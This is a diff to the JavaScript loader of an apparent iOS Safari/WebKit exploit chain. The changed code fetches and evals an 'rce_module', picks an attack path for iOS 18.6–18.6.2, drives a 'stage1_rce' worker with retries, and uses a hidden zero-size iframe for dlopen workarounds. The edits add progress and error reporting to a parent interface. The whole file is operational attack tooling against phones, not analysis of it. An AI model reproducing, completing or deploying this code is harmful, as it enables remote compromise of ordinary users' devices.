@@ -5,9 +5,20 @@ var offsets = {};
 var slide;
 var chipset;
 var device_model;
-var localHost = ""
+var localHost = "";
+
+// Send status to parent UI
+function sendStatus(stage, status, percent, isError) {
+    if (window.parentStage) {
+        window.parentStage(stage, status, percent, isError);
+    }
+}
+
 function print(x, reportError = false, dumphex = false) {
     let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
+    if (window.parentLog) {
+        window.parentLog('LOG', x);
+    }
     if (!SERVER_LOG && !reportError) return;
     let obj = {
         id: logEntryID++,
@@ -17,13 +28,12 @@ function print(x, reportError = false, dumphex = false) {
         obj.hex = 1
         obj.text = x
     }
-    //let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
-    //const xhr = new XMLHttpRequest();
-    //xhr.open("GET", "/log.html?" + req , false);
-    //xhr.send(null);
 }
 function redirect()
 {
+    if (window.parentError) {
+        window.parentError('Redirect triggered');
+    }
     window.location.href = "/404.html"; 
 }
 function getJS(fname,method = 'GET') 
@@ -84,6 +94,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
       redirect();
     }
     function main() {
+        if (window.parentStage) window.parentStage('stage1', 'Initializing...', 5);
         const randomValues = new Uint32Array(32);
         const begin = Date.now();
         const origin = location.origin;
@@ -107,6 +118,8 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         iframe.style.height = 0;
         iframe.style.width = 0;
         document.body.appendChild(iframe);
+        if (window.parentLog) window.parentLog('INIT', 'Iframe created for dlopen workarounds');
+        
         async function message_handler(e) {
         const data = e.data;
         switch (data.type) {
@@ -117,10 +130,12 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             }
             case 'prepare_dlopen_workers':
             {
+                if (window.parentLog) window.parentLog('STAGE1', 'Preparing dlopen workers...');
                 await prepare_dlopen_workers();
                 worker.postMessage({
                 type: 'dlopen_workers_prepared'
                 });
+                if (window.parentLog) window.parentLog('STAGE1', 'dlopen workers prepared');
                 break;
             }
             case 'trigger_dlopen1':
@@ -173,18 +188,22 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                 rceCode = getJS(`/local/rce_module_18.6.js?${Date.now()}`); // local version
             else
                 rceCode = getJS(`/local/rce_module.js?${Date.now()}`); // local version
+        
+        if (window.parentLog) window.parentLog('STAGE1', 'RCE module loaded, evaluating...');
         try
         {
             eval(rceCode);
         }
         catch(e)
         {
-            //print("Got exception while running rce: " + e);
+            if (window.parentLog) window.parentLog('ERROR', 'RCE eval exception: ' + e.message, 'error');
         }
         let desiredHost = "";
         desiredHost = localHost;
+        if (window.parentStage) window.parentStage('stage1', 'Triggering WebContent RCE...', 15);
             if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
             {
+                if (window.parentLog) window.parentLog('STAGE1', 'Using iOS 18.6 exploit path');
                 worker.postMessage({
                     type: 'stage1_rce',
                     desiredHost,
@@ -198,12 +217,17 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         attempt.start().then((result) => {
             if(!result)
             {
-               // print("Retrying");
+                if (window.parentLog) window.parentLog('STAGE1', 'First attempt failed, retrying...');
                 attempt.start().then((result) => {
                     if(!result)
+                       {
+                       if (window.parentLog) window.parentLog('STAGE1', 'Second attempt also failed', 'warn');
                        print("");
+                       }
                     else
                             {
+                        if (window.parentStage) window.parentStage('stage1', 'RCE succeeded, building primitives...', 25);
+                        if (window.parentLog) window.parentLog('STAGE1', 'RCE succeeded, Stage 1 complete');
                         worker.postMessage({
                         type: 'stage1',
                         begin,
@@ -221,7 +245,8 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                     }
                     else
                     {
-                        //WebViewComptability(attempt, iframe);
+                        if (window.parentStage) window.parentStage('stage1', 'RCE succeeded, building primitives...', 25);
+                        if (window.parentLog) window.parentLog('STAGE1', 'RCE succeeded, Stage 1 complete');
             worker.postMessage({
                 type: 'stage1',
                 begin,
@@ -240,7 +265,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         }
         catch(e)
         {
-       // print("Got exception on something: " + e);
+       if (window.parentLog) window.parentLog('ERROR', 'Exception in main: ' + e.message, 'error');
         }
     }
     main();
